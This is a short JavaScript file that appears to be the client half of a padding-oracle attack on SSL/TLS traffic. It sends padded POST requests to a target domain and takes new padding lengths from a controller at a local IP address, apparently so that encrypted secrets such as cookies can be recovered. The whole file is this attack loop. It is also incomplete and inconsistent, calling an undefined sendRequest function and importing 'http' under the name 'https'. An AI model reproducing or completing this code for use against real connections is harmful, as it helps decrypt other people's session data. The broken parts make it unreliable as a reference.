const https = require('http');
const url = require('url');

var urllen = 0;
var postlen = 26;
var delay = 10;

function strPad(n) {
    if (n > 0) {
        return Array(n + 1).join("A");
    } else {
        return "";
    }
}


function performSSLRequest() {
    const paddedUrl = "https://testdomain.com" + strPad(urllen);
    const postData = strPad(postlen);

    sendRequest(
        'POST',
        paddedUrl,
        postData,
        function (response) {
            // On successful POST, proceed to query the next request
            queryNextRequest();
        },
        function (errorCode, errorMessage) {
            console.error("Error in performSSLRequest:", errorCode, errorMessage);
        },
        5000
    );
}

function queryNextRequest() {
    sendRequest(
        'GET',
        "http://192.168.0.12/nextRequest",
        null,
        function (response) {
            const res = response.split(":");
            urllen = Number(res[0]);
            postlen = Number(res[1]);

            // Schedule the next SSL request after a delay
            setTimeout(performSSLRequest, delay);
        },
        function (errorCode, errorMessage) {
            console.error("Error in queryNextRequest:", errorCode, errorMessage);
        },
        5000
    );
}

performSSLRequest();